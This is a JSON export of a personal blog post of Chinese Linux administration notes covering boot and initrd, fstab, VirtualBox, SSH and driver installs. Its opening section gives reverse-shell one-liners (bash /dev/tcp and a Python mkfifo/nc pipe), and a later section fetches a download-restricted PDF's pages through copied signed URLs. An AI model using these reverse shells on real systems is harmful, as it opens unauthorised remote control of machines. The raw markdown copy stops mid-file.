{"meta":{"title":"H-ZeX","subtitle":"H-ZeX's Coding Life","description":null,"author":"H-ZeX","url":"https://h-zex.github.io"},"pages":[{},{},{}],"posts":[{"title":"My ITOps Note","date":"2019-02-02T06:18:30.000Z","path":"2019/02/02/My-ITOPS-Note/","text":"Reverse Shell 受控机器上执行bash -i /dev/tcp/IP/PORT 0&lt;&amp;1 (最后改为0&gt;&amp;1也ok)，入侵者机器提前打开listen socket，可以实现reverse shell eval(&quot;__import__(&#39;os&#39;).system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1 | nc localhost 8000 &gt; /tmp/f&#39;)&quot;)（python代码）也可以 SIGINT的SIG_DEF 默认的handler会输出一个换行。 代码 12345#include &lt;unistd.h&gt;int main()&#123; sleep(10);&#125; 如果不kill -2 a.out则不会输出一个空行，如果kill则会 boot过程 究竟是否有使用 /dev/sda 第一个sector，还是说uefi中我选择deepin 的boot loader那么直接就去sda12读取第一个sector 我在grub命令行环境可以很好的读取各个分区的东西，那么为什么还需要initrd /boot/initrd.img-4.9.0-deepin13-amd64。（我甚至可以在这条命令前去加载一个ntfs的module）。 既然boot loader 可以加载/boot/目录中的vmlinuz、initrd，那么为什么还需要kernel 加载sata驱动来加载文件呢 关于initrd The special file /dev/initrd is a read-only block device. This device is a RAM disk that is initialized (e.g., loaded) by the boot loader before the kernel is started. The kernel then can use /dev/initrd’s contents for a two-phase system boot-up. In the first boot-up phase, the kernel starts up and mounts an initial root filesystem from the contents of /dev/initrd (e.g., RAM disk initialized by the boot loader). In the second phase, additional drivers or other modules are loaded from the initial root device’s contents. After loading the additional modules, a new root filesystem (i.e., the normal root filesystem) is mounted from a different device.Boot-up operation When booting up with initrd, the system boots as follows: The boot loader loads the kernel program and /dev/initrd’s contents into memory. On kernel startup, the kernel uncompresses and copies the contents of the device /dev/initrd onto device /dev/ram0 and then frees the memory usedby /dev/initrd. The kernel then read-write mounts the device /dev/ram0 as the initial root filesystem. If the indicated normal root filesystem is also the initial root filesystem (e.g., /dev/ram0) then the kernel skips to the last step for theusual boot sequence. If the executable file /linuxrc is present in the initial root filesystem, /linuxrc is executed with UID 0. (The file /linuxrc must have exe‐cutable permission. The file /linuxrc can be any valid executable, including a shell script.) If /linuxrc is not executed or when /linuxrc terminates, the normal root filesystem is mounted. (If /linuxrc exits with any filesystems mountedon the initial root filesystem, then the behavior of the kernel is UNSPECIFIED. See the NOTES section for the current kernel behavior.) If the normal root filesystem has a directory /initrd, the device /dev/ram0 is moved from / to /initrd. Otherwise, if the directory /initrd doesnot exist, the device /dev/ram0 is unmounted. (When moved from / to /initrd, /dev/ram0 is not unmounted and therefore processes can remain run‐ning from /dev/ram0. If directory /initrd does not exist on the normal root filesystem and any processes remain running from /dev/ram0 when/linuxrc exits, the behavior of the kernel is UNSPECIFIED. See the NOTES section for the current kernel behavior.) The usual boot sequence (e.g., invocation of /sbin/init) is performed on the normal root filesystem. tab补全失效 when press tab to 补全, there is bash: 无法为立即文档创建临时文件: 权限不够 this is because of the /dev/sda9 is mounted on /tmp, umonut it repair this error 登录用户管理 users或 w查看当前登录的用户 lsof -iTCP netstat -tunp查看当前的网络连接 查看打开的端口 pkill -kill -t pts/1 踢掉pts/1 编辑/etc/hosts.deny ，deny掉ip或ip段，保存立即生效？(至今仍然不知道是否有效，以及不知道通配符要怎么写，好像是 xx.xx.xx.表示xx.xx.xx.00/24子网) 格式如下（其实不是非常确定以下是有用的） 12sshd:218.65.30.43:denysshd:58.*.*.*:deny 是否没有listen的socket就无法被入侵？wget使用 -r递归下载 -k把下载下来的连接修改为本地地址 -e robots=off不respectrobots.txt 或者是 set the robots variable to ‘off’ in your .wgetrc. --user-agent=&quot;&quot;不添加user-agent头，如果不加上这个，有些网站会返回404 curl的使用 curl可以模拟post/get等行为，但是似乎没法递归下载 axel的使用 -n 100开100个线程 好像还可以调整缓存，从而减少写入磁盘的次数 VirtualBox报错“kernel dirver not installed” 复现：编译4.17内核（非稳定版，仓库也没有linux-header-4.17）并安装，安装过程中就报了一个有关virtualbox的错。后面跑这个内核时，virtualbox就提示“kernel driver not installed”，要求重新安装virtualbox-dkms，并运行modprobe vboxdrv 在4.17内核尝试 12345sudo apt updatesudo apt install virtualbox-dkmssudo apt install --reinstall linux-headers-4.15 virtualbox-dkms dkmssudo apt install --reinstall linux-headers-$(uname -r) virtualbox-dkms dkms... 都没有解决问题，更严重的，linux-header-4.17也没有 切换到4.15内核没有解决问题。尝试了以上命令无果 删除4.17内核（直接在/boot/运行rm *4.17* -r）后update-grub。然后重启到4.15.0-23-generic并执行 1234sudo apt updatesudo apt install --fix-missingsudo apt install --reinstall linux-headers-4.15 virtualbox-dkms dkms sudo modprobe vboxdrv 解决问题 题外话：删除内核时，dpkg --get-selections | grep linux 没有看到4.17相关的 删除内核 sudo apt-get remove linux-headers-4.4.0-22 在/boot/目录下删除相关的东西 chmod chmod -R 666 test(test is a directory)会导致文件夹里的东西不可读（ls、cd该文件夹都不行） 给文件夹本身加上x——chmod 777 test就可以了——文件夹内的东西不需要有可执行权限，但是文件夹的权限要有x标志 内核模块加载 modprobe tcp_bbr加载tcp_bbr模块 比如，echo &quot;tcp_bbr&quot;&gt;&gt; /etc/modules-load.d/modules.conf即可实现启动自动加载该模块 ufw 如果有一条规则允许任意from ip 连本机的某个端口，协议是udp，然后还有另一条规则是只允许某ip K连本机的任意端口，协议是tcp，那么用ip 为K的机子去连是连不上udp的，似乎是因为规则的强弱导致的覆盖 安装centos.md联网 参考资料 修改/etc/sysconfig/network-scripts/ifcfg-eth0 (此处为网卡名对应的文件，比入enps0是ifcfg-enps0) 改为 12345DEVICE=eth0HWADDR=&quot;00:22:19:09:4D:3C&quot;NM_CONTROLLED=yesONBOOT=yes # 默认是 no，我们要改成 yesBOOTPROTO=dhcp # 如果不是这个值也要修改 重启network service 方法一：service network restart 方法二：/etc/init.d/network restart vbox似乎默认有开nat，所以以上即可，qemu好像要自己配置nat 安装图形界面 安装图形界面 yum groupinstall &quot;X Window System&quot; yum install gnome-classic-session gnome-terminal nautilus-open-terminal control-center liberation-mono-fonts unlink /etc/systemd/system/default.target ln -sf /lib/systemd/system/graphical.target /etc/systemd/system/default.target 使用fstab自动挂载Deepin 以下是/etc/fstab的内容 在Linux hzx-PC 4.9.0-deepin13-amd64 #1 SMP PREEMPT Deepin 4.9.57-1 (2017-10-19) x86_64 GNU/Linux正确工作 代码 1234567891011121314151617181920212223# /dev/sda7UUID=1faa19b8-abfb-44db-b186-5a368498d42b / ext4 rw,relatime,data=ordered 0 1# /dev/sda1UUID=CCCB-BF68 /boot/efi vfat rw,relatime,fmask=0022,dmask=0022,codepage=437,iocharset=ascii,shortname=mixed,utf8,errors=remount-ro 0 2# /dev/sda4UUID=0ca7110f-0b3c-4452-aace-5b3dd99456f3 none swap defaults 0 0# /dev/sda5# UUID=0CADCC32742391F2 /home/hzx/sda5 ntfs defaults 0 1UUID=0CADCC32742391F2 /mnt/data ntfs defaults 1 2# /dev/sda2 /run/media/wuxu/Windows ntfs defaults 1 2# /dev/sda2 /run/media/wuxu/bin ntfs defaults 1 2# /dev/sda6# UUID=2A3C344750F6F698 /home/hzx/sda6 ntfs defaults 0 1UUID=2A3C344750F6F698 /mnt/software ntfs defaults 1 2# /dev/sda3# UUID=9bb0bb13-a28a-48a4-8022-6e83dcec47aa /home/hzx/sda3 ext4 defaults 0 1UUID=9bb0bb13-a28a-48a4-8022-6e83dcec47aa /mnt/deepin-sda3 ext4 defaults 1 2 然而并没有一直正常，后来修改了一次挂载点后，就一直崩，无论是把defaults换成nofail还是相反，都没用 后来多启动几次就好了，，可能是类似多进程执行顺序之类的东西导致的不确定性错误 Ubuntu 一切正常 代码 1234567891011121314151617181920212223242526272829# /etc/fstab: static file system information.## Use &apos;blkid&apos; to print the universally unique identifier for a# device; this may be used with UUID= as a more robust way to name devices# that works even if disks are added and removed. See fstab(5).## &lt;file system&gt; &lt;mount point&gt; &lt;type&gt; &lt;options&gt; &lt;dump&gt; &lt;pass&gt;# / was on /dev/sda8 during installationUUID=3ae3faef-8fe6-42ef-8874-a0417df43831 / ext4 errors=remount-ro 0 1# /boot/efi was on /dev/sda1 during installationUUID=CCCB-BF68 /boot/efi vfat umask=0077 0 1# swap was on /dev/sda4 during installationUUID=0ca7110f-0b3c-4452-aace-5b3dd99456f3 none swap sw 0 0# /dev/sda5# UUID=0CADCC32742391F2 /home/hzx/sda5 ntfs defaults 0 1UUID=0CADCC32742391F2 /media/hzx/0CADCC32742391F2 ntfs nofail 1 2# /dev/sda2 /run/media/wuxu/Windows ntfs defaults 1 2# /dev/sda2 /run/media/wuxu/bin ntfs defaults 1 2# /dev/sda6# UUID=2A3C344750F6F698 /home/hzx/sda6 ntfs defaults 0 1UUID=2A3C344750F6F698 /media/hzx/2A3C344750F6F698 ntfs nofail 1 2# /dev/sda9UUID=202D1B334927E0CC /media/hzx/202D1B334927E0CC ntfs nofail 1 2# /dev/sda3# UUID=9bb0bb13-a28a-48a4-8022-6e83dcec47aa /home/hzx/sda3 ext4 defaults 0 1UUID=9bb0bb13-a28a-48a4-8022-6e83dcec47aa /media/hzx/9bb0bb13-a28a-48a4-8022-6e83dcec47aa ext4 nofail 1 2 mkfs.vfat了sda2那个efi分区结果deepin启动不了 情况是这样的：往sda2装grub后总是失败，然后deepin自己的boot分区虽然也有grub，也有grub.cfg但是也一直必须手动引导。然后把sda2格式化后不知道为什么deepin无法启动。 放弃，新装一个deepin 15.6，然后就会自动安装引导。 搞定后，进原来那个deepin15.5还是失败，查看journalctl -xb，发现有个设备无法加载还是怎样的，然后想到以前该fstab也这样，所以比对错误信息和fstab，果然如此。 原因是swap分区的uuid改了，并且也从sda4变成sda5，然而并没有去新建分区什么的，只有格式化sda2。 后来猜测之所以装不上grub可能是sda2太小，只有100M，deepin提示说至少要300M 编译内核.md无openssl/bio.h 编译Linux-4.9.11内核时遇到：“error : openssl/bio.h :No such file or folder” “ #include &lt;openssl/bio.h&gt;” &lt;&lt;&gt;&gt; 解决方法: [ubuntu 16.10,64位主机] sudo apt install libssl-dev 记一次尝试下载 不允许下载的sinacloud的pdf 获得页面源代码 在html搜索字符串next从而定位到逻辑代码 然后看到后面一堆JavaScript:void(0)，发现前面有个函数，但是页面内一堆引用外部的js脚本 然后去chrome控制台使用以下代码 123456setTimeout(function() &#123; var script = document.createElement('script'); script.type = 'text/javascript'; script.innerHTML = \"console.log(closePay)\"//括号内是要获得的函数名称; document.head.appendChild(script);&#125;, 1000); 然后等chrome显示出来后，点击显示出来的东西可以跳转到source code那里。从而最终定位到该函数所在的脚本，但是苦于代码过度，审计失败 直接wget那些url得到的是206，但是wget一直停不下来，尝试用axel开20个线程下载，但是每次下来的都是13.9m大小的东西，然后还打不开（除了其中一页图片） 查看chrome控制台的network模块，发现图片都没那么大，所以尝试右键copy request head发现并没有特别的，所以不知道为什么wget和axel没成功，copy curl后发现似乎是一个curl命令，加上-o参数后成功下载，curl即使不加上请求头，也可以正常获得东西，nice 附录12345678910111213//request headhttp://sinacloud.net/swf.ishared/5O0d4lu5e1.jpg?Expires=1523242733&amp;KID=sina%2CSAE0000000W1W2NYLKW2&amp;ssig=K74aTt3a0F&amp;range=6020439-6389345GET /swf.ishared/5O0d4lu5e1.jpg?Expires=1523242733&amp;KID=sina%2CSAE0000000W1W2NYLKW2&amp;ssig=K74aTt3a0F&amp;range=6020439-6389345 HTTP/1.1Host: sinacloud.netConnection: keep-aliveUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36Accept: image/webp,image/apng,image/*,*/*;q=0.8DNT: 1Accept-Encoding: gzip, deflateAccept-Language: en,zh;q=0.9,zh-CN;q=0.8//从chrome复制的curl命令curl 'http://sinacloud.net/swf.ishared/5O0d4lu5e1.jpg?Expires=1523242733&amp;KID=sina%2CSAE0000000W1W2NYLKW2&amp;ssig=K74aTt3a0F&amp;range=3259947-3560373' -H 'Accept: image/webp,image/apng,image/*,*/*;q=0.8' -H 'Connection: keep-alive' -H 'DNT: 1' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en,zh;q=0.9,zh-CN;q=0.8' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36' --compressed 查找并删除特定文件.md来源linux命令每日一练linux中find与rm实现查找并删除目录或文件 linux 下用find命令查找文件，rm命令删除文件。 删除指定目录下指定文件find 要查找的目录名 -name .svn |xargs rm -rf 删除指定名称的文件或文件夹: find -type d | grep .svn$ | xargs rm -r 分析：find -type d | grep .svn$ 通过此命令查找文件夹 过滤正则表达式中的目录| xargs rm -r 执行删除指令 删除目录下所有exe文件 find . -name ‘*.exe’ -type f -print -exec rm -rf {} ; (1) “.” 表示从当前目录开始递归查找 (2) “ -name ‘*.exe’ “根据名称来查找，要查找所有以.exe结尾的文件夹或者文件 (3) “ -type f “查找的类型为文件 (4) “-print” 输出查找的文件目录名 (5) 最主要的是是-exec了，-exec选项后边跟着一个所要执行的命令，表示将find出来的文件或目录执行该命令。exec选项后面跟随着所要执行的命令或脚本，然后是一对儿{}，一个空格和一个，最后是一个分号 VPS上部署hexo 参考文章 遇到nginx 403，然后就关闭selinux 1、临时关闭setenforce 0 #设置SELinux 成为permissive模式 setenforce 1 设置SELinux 成为enforcing模式2、修改配置文件需要重启机器： 修改/etc/selinux/config 文件 将SELINUX=enforcing改为SELINUX=disabled 重启机器即可 搭建ss服务器 vps开了进程 本地主机也如此 但是提示[Errno 113] No route to host 实在搞不明白——22端口可以用scp发文件过去vps 所以用py写了个tcpclient、tcpserver，然后一运行也如此提示 所以在vps运行service firewalld stop 其他关闭服务器防火墙的方法都不起作用，不知道问什么 VLC字幕链接 vbox的win7虚拟机无法使用usb 引用自 安装Virtualbox Extension Pack 用户权限添加 添加usbfs 用户组（virtualbox 装完成后会有 vboxusers 和vboxsf ）sudo groupadd usbfs 将你的linux常用用户添加到vboxusers、usbfs这个两个组中sudo adduser kuein vboxusers sudo adduser kuein usbfs 重启电脑，启动Virtualbox，确认在virtualbox管理器中，USB设备的enable usb controler 、enable usb2.0 controler打勾。Win7启动后，右击右下角USB设备符号，在Setting中，选择USB Massage相关的选项，就会自动安装驱动，驱动安装成功后，win7下成功挂载U盘。 Gnome-configure.mdhide title barno-title-bar-extention SSH.md生成秘钥 本地用ssh-keygen生成一个秘钥——可以自定义储存的文件名 把id_rsa.pub传送到vps上，cat id_rsa.pug &gt; ~/.ssh/authorized_keys，注意，这个命令会覆盖原有的authorized_keys内容 本地配置VPS别名 代码 12345678cat &gt;&gt; ~/.ssh/config &lt;&lt;EOFHost VultrVPS User root Hostname 217.163.11.0 PreferredAuthentications publickey IdentityFile ~/.ssh/VultrVPS_rsa Port 22EOF 以上可实现使用秘钥 ，多个VPS可以依次增加配置 Linux安装.md硬盘安装deepin 来源 将如下grub菜单放到/boot/grub/grub.cfg的menuentry菜单处/deepin-15.5-amd64.iso是deepin的镜像文件完整路径，可以自由地放在linux或windows分区中，区分大小写 12345678menuentry &quot;UEFI Deepin 15.4 Linux ISO live&quot; --class deepin --class gnu-linux --class gnu --class os&#123; echo &apos;booting...&apos; set isofile=/deepin-15.5-amd64.iso search --file $isofile --set=root loopback loop $isofile linux (loop)/live/vmlinuz.efi findiso=$isofile noprompt quiet boot=live ro deepin-installer locales=zh_CN.UTF-8 keyboard-configuration/layoutcode=us keyboard-configuration/variantcode= -- rootflags=sync initrd (loop)/live/initrd.lz&#125; 刻录U盘安装Fedora或Centos win下使用PowerISO刻录 使用简单的dd命令dd if=xxx of=xxx bs=xx失败 使用Ultraiso失败 U盘grub引导多个linux镜像安装 U盘引导多个linux镜像安装,同时支持BIOS和UEFI模式。文中提供的deepin的那个grub配置无效 使用grub2制作启动U盘，尝试把grub配置换为该链接的配置，可以启动到deepin进行安装，但是中途说挂载某分区失败从而安装失败 OSC提供的代码make不过12345678910111213source code 9th/final-src-osc9e/ch2 ➜ make make -C /lib/modules/4.9.0-deepin13-amd64/build M=/home/hzx/Program/source code 9th/final-src-osc9e/ch2 modulesmake[1]: Entering directory '/usr/src/linux-headers-4.9.0-deepin13-amd64'arch/x86/Makefile:140: CONFIG_X86_X32 enabled but no binutils supportmake[3]: *** No rule to make target 'code'. Stop.Makefile:150: recipe for target 'sub-make' failedmake[2]: *** [sub-make] Error 2Makefile:8: recipe for target 'all' failedmake[1]: *** [all] Error 2make[1]: Leaving directory '/usr/src/linux-headers-4.9.0-deepin13-amd64'Makefile:3: recipe for target 'all' failedmake: *** [all] Error 2 解决方法，把source code 9th这个文件名的空格去掉 vim dos unix 如果某文本文件的行末都有0d0a，则vim直接打开识别为dos。如果是vim -b 打开，识别为unix。如果最后一行不是0d0a，其他行是，不识别为dos。 删除文件名以-开头的文件 比如删除-a：rm -- -a 文件的change，modification时间 以下来自于实验：change是修改属性，比如touch -d 1111 filename，modification是修改内容 ctags 注意事项 如果某文件打开后编辑过，可能ctags打的tag就失效了（比如行号不对），所以跳转无效 watch命令 watch -n 0.1 ./a.o 与watch ./a.o -n 0.1的区别是前者-n 0.1是watch的参数，后者是./a.o的参数 修复light display manger失败 通过启动时的错误信息，还有single模式中，service lightdm start后的错误信息（systemctl service ）可以知道light display manager启动失败 搜到的都说重新安装dde，但是需要网络，而single-user mode 是没有网络的。然后其他模式又没搜到要怎么进去，到是grub图形界面有提供一个带网络的recovery模式，不过我没有grub图形界面 就搜了搜在single模式联网——按照定义，single模式是没有网络的。然后联网后install dde，中途flatpak提示desktopRecord.service不存在，然后错误处理ctrl-c了dde的安装过程。然后后来按照dde的安装信息提示安装其他组件console-setup，然后使用sudo apt-get install –reinstall dde修复了dde的安装（apt -f在这里是没用的） 不知道为什么中途提示proxychain 的配置文件修改了 本来想着要是没网，就下个lightdm 来安装，结果没有binary的文件，装不了。 后来安装好dde后startx老是说成功退出——没有任何报错信息，都是成功，连退出都是成功退出，但是就是不符合我的预期 查看glibc版本 ldd --version getconf GNU_LIBC_VERSION shell使用|时的SIGPIPE 比如proc_1 | proc_2，如果第二个进程关闭，第一个就会管道破裂，如果没有处理就会die 安装nvidia驱动 在nvidia官网下程序 telinit 3关掉X server（或者是systemctl stop lightdm.service） 安装过程中需要编译内核模块，编译时使用的gcc版本要与编译内核的gcc版本一致 12$ cat /proc/versionLinux version 4.15.0-29deepin-generic (pbuilder@zs-PC) (gcc version 7.3.0 (Debian 7.3.0-19)) #31 SMP Fri Jul 27 07:12:08 UTC 2018 安装时，如果有驱动占用了gpu，那么会失败，在/etc/modprobe.d/加一个文件（命名为*.conf） 12345678910blacklist nouveaublacklist rivafbblacklist rivatvblacklist nvidiafb# 下面这几条应该可以不用，我不加也成功options nouveau modeset=0 options rivafb modeset=0options rivatv modeset=0options nvidiafb modeset=0 安装过程中我一开始选使用dkms，但是失败，后来没选，也失败了几次，所以不清楚dkms的情况 安装后要运行nvidia-xconfig配置/etc/X11/xorg.conf，或者自己手动配置（然而我这里一直失败，一加相关的东西就启动卡住，而且也没有报错信息——我们又看其他信息，不知道其他信息有没有提示） 然而。事情没那么简单，我装了nvidia驱动后，deepin-wm cpu占用率飙升，nvidia-smi看不到使用gpu的进程，gg。没办法，卸了驱动，删了blacklist 后来发现deepin有个gpu driver manager，运行后，跑了很久，重启后还跑了很久，还看到一堆error，然后还开一个渲染画面让我看看渲染得咋样，然后后来启动成功，nvidia-smi也看到有deepin-wm的进程跑在gpu上，deepin-wm的cpu占用率也没有飙升，还行 Tilix dont inherit the directory The VTE matter this sogouPinyin候选框异常解决方法 其实也不算解决，我在配置文件里把所有能关掉skin的选项都关了，sougou还是不使用fcitx的skin，删了~/.config下面的sogou相关配置文件也没用 后来发现，如果有其他输入法一起，然后切换过其他输入法，sogoupinyin的皮肤就跟那个输入法的一样（也不知道是不是一样，我的fcitx不能切换皮肤，所有只有一个皮肤） cache的详细信息（包括相联度，电压等） sudo dmidecode -t 7 getconf -a | grep CACHE 设置默认浏览器 xdg-settings set default-web-browser chrome.desktop xdg-settings get default-web-browser获取值 关于desktop文件的Exec段中的后缀，doc %i The Icon key of the desktop entry expanded as two arguments, first –icon and then the value of the Icon key. Should not expand to any arguments if the Icon key is empty or missing.%c The translated name of the application as listed in the appropriate Name key in the desktop entry.%k The location of the desktop file as either a URI (if for example gotten from the vfolder system) or a local filename or empty if no location is known.%f A single file name (including the path), even if multiple files are selected. The system reading the desktop entry should recognize that the program in question cannot handle multiple file arguments, and it should should probably spawn and execute multiple copies of a program for each selected file if the program is not able to handle additional file arguments. If files are not on the local file system (i.e. are on HTTP or FTP locations), the files will be copied to the local file system and %f will be expanded to point at the temporary file. Used for programs that do not understand the URL syntax.%F A list of files. Use for apps that can open several local files at once. Each file is passed as a separate argument to the executable program.%u A single URL. Local files may either be passed as file: URLs or as file path.%U A list of URLs. Each URL is passed as a separate argument to the executable program. Local files may either be passed as file: URLs or as file path. github账户有设置ssh但是仓库push还是要用户密码的解决方法 这是因为remote add时使用的是https，而不是ssh git remote -v可以看到是https链接 git remote set-url origin git@github.com:USERNAME/REPOSITORY.git改为ssh 参考","raw":"---\ntitle: My ITOps Note\ndate: 2019-2-2 14:18:30\ntags:\n- ITOps\ncategories:\n- 运维\n---\n\n### Reverse Shell\n\n- 受控机器上执行`bash -i /dev/tcp/IP/PORT 0<&1` (最后改为`0>&1`也ok)，入侵者机器提前打开listen socket，可以实现reverse shell\n- `eval(\"__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc localhost 8000 > /tmp/f')\")`（python代码）也可以\n\n### SIGINT的SIG_DEF\n\n- 默认的handler会输出一个换行。\n- 代码\n   ```c\n   #include <unistd.h>\n   int main()\n   {\n       sleep(10);\n   }\n   ```\n- 如果不`kill -2 a.out`则不会输出一个空行，如果kill则会\n\n### boot过程\n\n- 究竟是否有使用 /dev/sda 第一个sector，还是说uefi中我选择deepin 的boot loader那么直接就去sda12读取第一个sector\n- 我在grub命令行环境可以很好的读取各个分区的东西，那么为什么还需要`initrd\t/boot/initrd.img-4.9.0-deepin13-amd64`。（我甚至可以在这条命令前去加载一个ntfs的module）。\n- 既然boot loader 可以加载`/boot/`目录中的vmlinuz、initrd，那么为什么还需要kernel 加载sata驱动来加载文件呢\n- 关于initrd \n   > The special file /dev/initrd is a read-only block device. This device is a RAM disk that is initialized (e.g., loaded) by the boot loader before the kernel is started. The kernel then can use /dev/initrd's contents for a two-phase system boot-up. In the first boot-up phase, the kernel starts up and mounts an initial root filesystem from the contents of /dev/initrd (e.g., RAM disk initialized by the boot loader). In the second phase, additional drivers or other modules are loaded from the initial root device's contents. After loading the additional modules, a new root filesystem (i.e., the normal root filesystem) is mounted from a different device. \n   > Boot-up operation\n   >    When booting up with initrd, the system boots as follows:\n   >    1. The boot loader loads the kernel program and /dev/initrd's contents into memory.\n   >    2. On kernel startup, the kernel uncompresses and copies the contents of the device /dev/initrd onto device /dev/ram0 and then frees the memory used\n   >       by /dev/initrd.\n   >    3. The kernel then read-write mounts the device /dev/ram0 as the initial root filesystem.\n   >    4. If  the  indicated  normal  root  filesystem is also the initial root filesystem (e.g., /dev/ram0) then the kernel skips to the last step for the\n   >       usual boot sequence.\n   >    5. If the executable file /linuxrc is present in the initial root filesystem, /linuxrc is executed with UID 0.  (The file /linuxrc  must  have  exe‐\n   >       cutable permission.  The file /linuxrc can be any valid executable, including a shell script.)\n   >    6. If  /linuxrc is not executed or when /linuxrc terminates, the normal root filesystem is mounted.  (If /linuxrc exits with any filesystems mounted\n   >       on the initial root filesystem, then the behavior of the kernel is UNSPECIFIED.  See the NOTES section for the current kernel behavior.)\n   >    7. If the normal root filesystem has a directory /initrd, the device /dev/ram0 is moved from / to /initrd.  Otherwise, if the directory /initrd does\n   >       not  exist, the device /dev/ram0 is unmounted.  (When moved from / to /initrd, /dev/ram0 is not unmounted and therefore processes can remain run‐\n   >       ning from /dev/ram0.  If directory /initrd does not exist on the normal root filesystem and any processes  remain  running  from  /dev/ram0  when\n   >       /linuxrc exits, the behavior of the kernel is UNSPECIFIED.  See the NOTES section for the current kernel behavior.)\n   >    8. The usual boot sequence (e.g., invocation of /sbin/init) is performed on the normal root filesystem.\n\n\n\n### tab补全失效\n\n- when press tab to 补全, there is   bash: 无法为立即文档创建临时文件: 权限不够\n- this is because of the /dev/sda9 is mounted on /tmp, umonut it repair this error\n\n### 登录用户管理\n\n- `users`或 `w`查看当前登录的用户\n\n- `lsof -iTCP` `netstat -tunp`查看当前的网络连接\n\n- 查看打开的端口\n\n- `pkill -kill -t pts/1` 踢掉pts/1\n\n- 编辑`/etc/hosts.deny` ，deny掉ip或ip段，保存立即生效？(至今仍然不知道是否有效，以及不知道通配符要怎么写，好像是 xx.xx.xx.表示xx.xx.xx.00/24子网)\n\n  格式如下（其实不是非常确定以下是有用的）\n\n  ```shell\n  sshd:218.65.30.43:deny\n  sshd:58.*.*.*:deny\n  ```\n\n### 是否没有listen的socket就无法被入侵？\n\n### wget使用\n\n- `-r`递归下载\n- `-k`把下载下来的连接修改为本地地址\n- ` -e robots=off`不respect`robots.txt`\n- 或者是 set the `robots` variable to ‘off’ in your .wgetrc. \n- `--user-agent=\"\"`不添加user-agent头，如果不加上这个，有些网站会返回404\n\n### curl的使用\n\n- curl可以模拟post/get等行为，但是似乎没法递归下载\n\n### axel的使用\n\n- `-n 100`开100个线程\n- 好像还可以调整缓存，从而减少写入磁盘的次数\n\n### VirtualBox报错“kernel dirver not installed”\n\n- 复现：编译4.17内核（非稳定版，仓库也没有linux-header-4.17）并安装，安装过程中就报了一个有关virtualbox的错。后面跑这个内核时，virtualbox就提示“kernel driver not installed”，要求重新安装` virtualbox-dkms`，并运行`modprobe vboxdrv`\n- 在4.17内核尝试\n   ```shell\n   sudo apt update\n   sudo apt install virtualbox-dkms\n   sudo apt install --reinstall linux-headers-4.15 virtualbox-dkms dkms\n   sudo apt install --reinstall linux-headers-$(uname -r) virtualbox-dkms dkms\n   ...\n   ```\n   都没有解决问题，更严重的，linux-header-4.17也没有\n- 切换到4.15内核没有解决问题。尝试了以上命令无果\n- 删除4.17内核（直接在`/boot/`运行`rm *4.17* -r`）后`update-grub`。然后重启到`4.15.0-23-generic`并执行\n   ```shell\n   sudo apt update\n   sudo apt install --fix-missing\n   sudo apt install --reinstall linux-headers-4.15 virtualbox-dkms dkms \n   sudo modprobe vboxdrv\n   ```\n   解决问题\n- 题外话：删除内核时，`dpkg --get-selections | grep linux` 没有看到4.17相关的\n\n### 删除内核\n\n- `sudo apt-get remove linux-headers-4.4.0-22`\n- 在`/boot/`目录下删除相关的东西\n\n### chmod\n\n- `chmod -R 666 test`(test is a directory)会导致文件夹里的东西不可读（ls、cd该文件夹都不行）\n- 给文件夹本身加上x——`chmod 777 test`就可以了——文件夹内的东西不需要有可执行权限，但是文件夹的权限要有`x`标志\n\n### 内核模块加载\n\n- `modprobe tcp_bbr`加载`tcp_bbr`模块 \n- 比如，`echo \"tcp_bbr\">> /etc/modules-load.d/modules.conf `即可实现启动自动加载该模块\n\n### ufw\n\n- 如果有一条规则允许任意from ip 连本机的某个端口，协议是udp，然后还有另一条规则是只允许某ip K连本机的任意端口，协议是tcp，那么用ip 为K的机子去连是连不上udp的，似乎是因为规则的强弱导致的覆盖\n\n### 安装centos.md\n\n#### 联网\n\n- [参考资料](http://icyleaf.com/2013/09/network-configuration-in-centos/)\n\n- 修改`/etc/sysconfig/network-scripts/ifcfg-eth0 (此处为网卡名对应的文件，比入enps0是ifcfg-enps0)`\n\n- 改为\n\n  ```\n    DEVICE=eth0\n    HWADDR=\"00:22:19:09:4D:3C\"\n    NM_CONTROLLED=yes\n    ONBOOT=yes      # 默认是 no，我们要改成 yes\n    BOOTPROTO=dhcp  # 如果不是这个值也要修改\n\n  ```\n\n- 重启network service\n\n  - 方法一：`service network restart`\n  - 方法二：`/etc/init.d/network restart`\n\n- vbox似乎默认有开nat，所以以上即可，qemu好像要自己配置nat\n\n#### 安装图形界面\n\n- [安装图形界面](https://www.quora.com/How-can-I-install-X-Windows-on-CentOS-7)\n  - `yum groupinstall \"X Window System\"`\n  - `yum install gnome-classic-session gnome-terminal nautilus-open-terminal control-center liberation-mono-fonts`\n  - `unlink /etc/systemd/system/default.target`\n  - `ln -sf /lib/systemd/system/graphical.target  /etc/systemd/system/default.target`\n\n### 使用fstab自动挂载\n\n#### Deepin\n\n- 以下是`/etc/fstab`的内容\n\n- 在`Linux hzx-PC 4.9.0-deepin13-amd64 #1 SMP PREEMPT Deepin 4.9.57-1 (2017-10-19) x86_64 GNU/Linux`正确工作\n\n- 代码\n\n  ```fstab\n  # /dev/sda7\n  UUID=1faa19b8-abfb-44db-b186-5a368498d42b\t/         \text4      \trw,relatime,data=ordered\t0 1\n\n  # /dev/sda1\n  UUID=CCCB-BF68      \t/boot/efi \tvfat      \trw,relatime,fmask=0022,dmask=0022,codepage=437,iocharset=ascii,shortname=mixed,utf8,errors=remount-ro\t0 2\n\n  # /dev/sda4\n  UUID=0ca7110f-0b3c-4452-aace-5b3dd99456f3\tnone      \tswap      \tdefaults  \t0 0\n\n  # /dev/sda5\n  # UUID=0CADCC32742391F2       /home/hzx/sda5  \t    ntfs defaults\t0 1\n  UUID=0CADCC32742391F2   /mnt/data  ntfs defaults  1   2\n\n  # /dev/sda2 /run/media/wuxu/Windows ntfs defaults 1 2\n  # /dev/sda2 /run/media/wuxu/bin ntfs defaults 1 2\n\n  # /dev/sda6\n  # UUID=2A3C344750F6F698       /home/hzx/sda6         ntfs defaults\t0 1\n  